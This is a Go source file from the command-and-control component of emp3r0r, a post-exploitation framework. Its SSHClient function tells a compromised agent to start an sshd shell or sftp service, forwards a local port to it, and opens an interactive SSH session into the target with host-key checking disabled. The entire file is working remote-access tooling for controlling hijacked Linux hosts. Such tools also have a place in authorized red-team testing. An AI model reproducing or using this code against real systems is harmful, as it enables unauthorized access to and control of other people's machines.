//go:build linux
// +build linux

package cc

import (
	"context"
	"errors"
	"fmt"
	"os/exec"
	"strconv"
	"strings"
	"time"

	"github.com/google/uuid"
	emp3r0r_def "github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_def"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

type SSH_SHELL_Mapping struct {
	Shell   string                    // the shell to run, eg. bash, python
	Agent   *emp3r0r_def.Emp3r0rAgent // the agent this shell is connected to
	PortFwd *PortFwdSession           // the port mapping for this shell session
	ToPort  string                    // the port to connect to on the agent side, always the same as PortFwd.To's port
}

// shell - port mapping
// one port for one shell
var SSHShellPort = make(map[string]*SSH_SHELL_Mapping)

// SSHClient ssh to sshd server, with shell access in a new tmux window
// shell: the executable to run, eg. bash, python
// port: serve this shell on agent side 127.0.0.1:port
func SSHClient(shell, args, port string, split bool) (err error) {
	// check if sftp is requested
	is_sftp := shell == "sftp"
	ssh_prog := "ssh"
	if is_sftp {
		ssh_prog = "sftp"
		shell = "sftp"
	}

	// if shell/sftp pane already exists, abort
	if split {
		if AgentShellPane != nil {
			if !is_sftp && AgentSFTPPane != nil {
				return
			}
		}
	}

	// SSHDShellPort is reserved
	is_new_port_needed := (port == RuntimeConfig.SSHDShellPort && shell != "sftp")
	// check if port mapping is already open, if yes, use it
	for s, mapping := range SSHShellPort {
		if s == shell && mapping.Agent == CurrentTarget {
			port = mapping.ToPort
			is_new_port_needed = false
		}
	}

	if !util.IsCommandExist("ssh") {
		err = fmt.Errorf("ssh must be installed")
		return
	}

	// check if we need a new (SSH) port (on the agent side, for new shell)
	lport := strconv.Itoa(util.RandInt(2048, 65535)) // shell gets mapped here
	new_port := strconv.Itoa(util.RandInt(2048, 65535))
	if is_new_port_needed {
		port = new_port // reset port

		// if sftp is requested, we are not using `interactive_shell` module
		// so no options to set
		if !is_sftp {
			SetOption([]string{"port", new_port})
		}
		CliPrintWarning("Switching to a new port %s for shell (%s)", port, shell)
	}
	to := "127.0.0.1:" + port // decide what port/shell to connect to

	// is port mapping already done?
	port_mapping_exists := false
	for _, p := range PortFwds {
		if p.Agent == CurrentTarget && p.To == to {
			port_mapping_exists = true
			for s, ssh_mapping := range SSHShellPort {
				// one port for one shell
				// if trying to open a different shell on the same port, change to a new port
				if s != shell && ssh_mapping.ToPort == port {
					new_port := strconv.Itoa(util.RandInt(2048, 65535))
					CliPrintWarning("Port %s has %s shell on it, restarting with a different port %s", port, s, new_port)
					SetOption([]string{"port", new_port})
					err = SSHClient(shell, args, new_port, split)
					return err
				}
			}
			// if a shell is already open, use it
			CliPrintWarning("Using existing port mapping %s -> remote:%s for shell %s", p.Lport, port, shell)
			lport = p.Lport // use the correct port
			break
		}
	}

	if !port_mapping_exists {
		// start sshd server on target
		cmd_id := uuid.NewString()
		if args == "" {
			args = "--"
		}
		cmd := fmt.Sprintf("%s --shell %s --port %s --args %s", emp3r0r_def.C2CmdSSHD, shell, port, args)
		err = SendCmdToCurrentTarget(cmd, cmd_id)
		if err != nil {
			return
		}
		CliPrintInfo("Waiting for sshd (%s) on target %s", shell, strconv.Quote(CurrentTarget.Tag))

		// wait until sshd is up
		defer func() {
			CmdResultsMutex.Lock()
			delete(CmdResults, cmd_id)
			CmdResultsMutex.Unlock()
		}()
		is_response := false
		res := ""
		for i := 0; i < 100; i++ {
			time.Sleep(100 * time.Millisecond)
			res, is_response = CmdResults[cmd_id]
			if is_response {
				if strings.Contains(res, "success") ||
					strings.Contains(res,
						fmt.Sprintf("listen tcp 127.0.0.1:%s: bind: address already in use", port)) {
					break
				} else {
					err = fmt.Errorf("start sshd (%s) failed: %s", shell, res)
					return
				}
			}
		}
		if !is_response {
			err = fmt.Errorf("didn't get response from agent (%s), aborting", CurrentTarget.Tag)
			return
		}

		// set up port mapping for the ssh session
		CliPrintInfo("Setting up port mapping (local %s -> remote %s) for sshd (%s)", lport, to, shell)
		pf := &PortFwdSession{}
		pf.Description = fmt.Sprintf("ssh shell (%s)", shell)
		pf.Ctx, pf.Cancel = context.WithCancel(context.Background())
		pf.Lport, pf.To = lport, to
		go func() {
			// remember the port mapping and shell and agent
			SSHShellPort[shell] = &SSH_SHELL_Mapping{
				Shell:   shell,
				Agent:   CurrentTarget,
				PortFwd: pf,
				ToPort:  port,
			}
			err = pf.RunPortFwd()
			if err != nil {
				err = fmt.Errorf("PortFwd failed: %v", err)
				CliPrintError("Start port mapping for sshd (%s): %v", shell, err)
			}
		}()
		CliPrintInfo("Waiting for response from %s", CurrentTarget.Tag)
		if err != nil {
			return
		}
	}

	// wait until the port mapping is ready
	port_mapping_exists = false
wait:
	for i := 0; i < 100; i++ {
		if port_mapping_exists {
			break
		}
		time.Sleep(100 * time.Millisecond)
		for _, p := range PortFwds {
			if p.Agent == CurrentTarget && p.To == to {
				port_mapping_exists = true
				break wait
			}
		}
	}
	if !port_mapping_exists {
		err = errors.New("port mapping unsuccessful")
		return
	}

	// let's do the ssh
	sshPath, err := exec.LookPath(ssh_prog)
	if err != nil {
		CliPrintError("%s not found, please install it first: %v", ssh_prog, err)
	}
	sshCmd := fmt.Sprintf("%s -p %s -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no 127.0.0.1",
		sshPath, lport)
	if is_sftp {
		sshCmd = fmt.Sprintf("%s -P %s -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no 127.0.0.1",
			sshPath, lport)
	}

	// agent name
	name := CurrentTarget.Hostname
	label := Targets[CurrentTarget].Label
	if label != "nolabel" && label != "-" {
		name = label
	}

	// if open in split tmux pane
	if split {
		if is_sftp {
			AgentSFTPPane, err = TmuxNewPane("SFTP", "v", AgentInfoPane.ID, 30, sshCmd)
			TmuxPanes[AgentSFTPPane.ID] = AgentSFTPPane
		} else {
			AgentShellPane, err = TmuxNewPane("Shell", "v", CommandPane.ID, 30, sshCmd)
			TmuxPanes[AgentShellPane.ID] = AgentShellPane
		}
		return err
	}

	// if open in new tmux window
	CliPrintInfo("\nOpening SSH (%s - %s) session for %s in Shell tab.\n"+
		"If that fails, please execute command\n%s\nmanaully",
		shell, port, CurrentTarget.Tag, sshCmd)

	// if a shell is wanted, just open in new tmux window, you will see a new tab
	return TmuxNewWindow(fmt.Sprintf("shell/%s/%s-%s", name, shell, port), sshCmd)
}
